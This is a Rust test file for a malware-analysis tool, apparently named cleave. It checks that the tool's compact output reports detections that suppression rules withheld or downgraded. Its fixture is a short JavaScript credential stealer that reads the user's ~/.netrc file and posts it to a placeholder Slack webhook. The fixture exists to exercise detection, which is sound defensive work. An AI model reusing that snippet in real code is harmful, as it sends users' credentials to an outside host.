//! Regression guard: `--format tiny` (the payload `scan --format interpret`
//! prints verbatim) must show what the analysis decided *not* to report.
//!
//! A reader that only sees the findings cannot tell a clean file from a
//! suppressed one, and the suppressor is the interesting half — a credential
//! path withheld because the file "looks like a test fixture" is a judgement
//! worth checking, not a fact. Every `unless:`/`downgrade:` leg that withheld or
//! demoted a notable-or-above trait is surfaced with the trait it acted on and
//! the bytes it fired on, so a downstream grader can reach its own conclusion.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use cleave::{AnalysisOptions, analyze_file};

/// Real shipped traits carry the `unless:` legs this exercises: a credential
/// path plus a remote URL, in a file whose path reads as a test fixture.
const SCRIPT: &str = r#"const fs = require("fs");
const os = require("os");
const axios = require("axios");
const body = fs.readFileSync(os.homedir() + "/.netrc", "utf8");
axios.post("https://hooks.slack.com/services/T01234567/B01234567/abcdefghij", { text: body });
"#;

#[test]
fn tiny_output_reports_what_was_withheld_and_why() -> anyhow::Result<()> {
    // A path the shipped test-harness traits recognize, which is what makes the
    // suppressor legs fire — the point of the test is the suppression, not the
    // detection.
    let dir = tempfile::tempdir()?;
    let fixtures = dir.path().join("testdata/simple-stealer");
    std::fs::create_dir_all(&fixtures)?;
    let path = fixtures.join("netrc-slack.js");
    std::fs::write(&path, SCRIPT)?;

    let mut report = analyze_file(&path, &AnalysisOptions::default())?;
    report.finalize();

    let file = report.files.first().expect("one analyzed file");
    assert!(
        !file.suppressions.is_empty(),
        "the shipped traits must withhold or demote something on this fixture; \
         findings: {:?}",
        file.findings.iter().map(|f| &f.id).collect::<Vec<_>>(),
    );

    for suppression in &file.suppressions {
        assert!(
            suppression.crit >= cleave::types::Criticality::Notable,
            "{} is below the recording floor",
            suppression.id,
        );
        assert!(
            !suppression.by.is_empty(),
            "{} records no leg — a suppression with no stated cause is not \
             reviewable",
            suppression.id,
        );
        assert!(
            suppression.by.iter().all(|leg| leg.id != suppression.id),
            "{} lists itself as its own suppressor",
            suppression.id,
        );
    }

    // The rendered payload must actually say so.
    let rendered = cleave::output::format_tiny(&report);
    assert!(
        rendered.contains("withheld") || rendered.contains("downgraded"),
        "the tiny payload must surface suppressions; got:\n{rendered}",
    );
    let named = file
        .suppressions
        .iter()
        .any(|s| rendered.contains(s.id.as_str()));
    assert!(
        named,
        "a suppression line must name the trait it acted on; got:\n{rendered}",
    );
    let leg_named = file
        .suppressions
        .iter()
        .flat_map(|s| &s.by)
        .any(|leg| rendered.contains(leg.id.as_str()));
    assert!(
        leg_named,
        "a suppression line must name the leg that caused it; got:\n{rendered}",
    );
    Ok(())
}

/// The record must not fill up with detections that were never in prospect.
///
/// `unless:` is checked before the positive condition, so a naive record would
/// list every hostile rule whose suppressor happened to fire — hundreds on a
/// few hundred bytes, none of which would ever have matched. Nothing recorded
/// may exceed what the file could plausibly have produced.
#[test]
fn suppressions_stay_proportionate_to_the_file() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let fixtures = dir.path().join("testdata/simple-stealer");
    std::fs::create_dir_all(&fixtures)?;
    let path = fixtures.join("netrc-slack.js");
    std::fs::write(&path, SCRIPT)?;

    let mut report = analyze_file(&path, &AnalysisOptions::default())?;
    report.finalize();
    let file = report.files.first().expect("one analyzed file");

    assert!(
        file.suppressions.len() <= file.findings.len().max(8),
        "{} suppressions against {} findings on a {}-byte file reads as \
         over-recording: {:?}",
        file.suppressions.len(),
        file.findings.len(),
        SCRIPT.len(),
        file.suppressions.iter().map(|s| &s.id).collect::<Vec<_>>(),
    );
    Ok(())
}

/// Build a report whose only content is the given suppressions, through the
/// real `finalize()` path that moves them onto `files[0]`.
fn report_with_only_suppressions(
    suppressions: Vec<cleave::types::Suppression>,
) -> cleave::AnalysisReport {
    let mut report = cleave::AnalysisReport::new(cleave::types::TargetInfo {
        path: "sample.js".to_string(),
        file_type: "javascript".to_string(),
        size_bytes: 128,
        sha256: "a".repeat(64),
        architectures: None,
    });
    report.suppressions = suppressions;
    report.finalize();
    report
}

/// Every recorded suppression must reach the interpret payload, including on a
/// file that has nothing else to show.
///
/// The tiny view is a budget: it drops files with no selected findings, filters
/// by criticality, caps findings per file, and in focused mode skips files
/// carrying nothing at focus grade. Each of those gates looked only at
/// `findings`, so a file whose detections were *all* withheld rendered as
/// nothing at all — the one case where the reader most needs to be told, and
/// the one where silence is most convincingly mistaken for a clean file.
#[test]
fn a_file_with_only_suppressions_still_reaches_the_payload() {
    use cleave::output::TinyOpts;
    use cleave::types::{Criticality, Suppression, SuppressionKind, SuppressionLeg};

    let report = report_with_only_suppressions(vec![Suppression {
        id: "objectives/exfiltration/messaging/webhook::generic-webhook-url".into(),
        crit: Criticality::Suspicious,
        kind: SuppressionKind::Unless,
        by: vec![SuppressionLeg {
            id: "metadata/package/testing/harness/runtime::is-test".into(),
            spans: vec![[0, 57]],
        }],
    }]);

    for (name, opts) in [
        ("tiny", TinyOpts::tiny()),
        ("terminal", TinyOpts::terminal()),
    ] {
        let rendered = cleave::output::format_context(&report, &opts);
        assert!(
            rendered.contains("objectives/exfiltration/messaging/webhook::generic-webhook-url"),
            "{name} view dropped a file whose only content was a suppression; got:\n{rendered}",
        );
        assert!(
            rendered.contains("metadata/package/testing/harness/runtime::is-test"),
            "{name} view lost the leg that did the withholding; got:\n{rendered}",
        );
    }
}

/// A suppression is never silently trimmed: past the per-file cap the payload
/// still states how many were withheld, so a reader is never left believing it
/// saw all of them.
#[test]
fn suppressions_past_the_cap_are_counted_not_dropped() {
    use cleave::output::TinyOpts;
    use cleave::types::{Criticality, Suppression, SuppressionKind, SuppressionLeg};

    let report = report_with_only_suppressions(
        (0..40)
            .map(|i| Suppression {
                id: format!("test/withheld::trait-{i}").into(),
                crit: Criticality::Notable,
                kind: SuppressionKind::Unless,
                by: vec![SuppressionLeg {
                    id: "test/context::benign".into(),
                    spans: vec![[0, 4]],
                }],
            })
            .collect(),
    );

    let rendered = cleave::output::format_context(&report, &TinyOpts::tiny());
    let listed = rendered.matches("withheld test/withheld::trait-").count();
    assert!(listed > 0, "nothing listed; got:\n{rendered}");
    assert!(
        listed == 40 || rendered.contains("more suppressed"),
        "{listed} of 40 suppressions listed with no count of the rest; got:\n{rendered}",
    );
}
